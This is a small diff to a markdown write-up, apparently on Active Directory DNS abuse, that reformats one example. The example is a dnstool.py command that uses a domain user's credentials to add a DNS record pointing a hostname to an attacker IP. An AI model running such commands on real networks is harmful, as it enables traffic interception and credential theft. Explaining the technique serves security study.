@@ -8,9 +8,9 @@ Thus, it is possible to add DNS entry with the rights of a regular domain user. 
 
 ![Image](/img/evil_dns/1.png)
 
-```
-Example 1:
 
+**Example 1:**
+```
 python3 dnstool.py -u 'yourdomain.ru\Tiffany.Molina' -p password --action add -r web332211.domain.ru -d attacker-ip ldap-ip
 ```
 
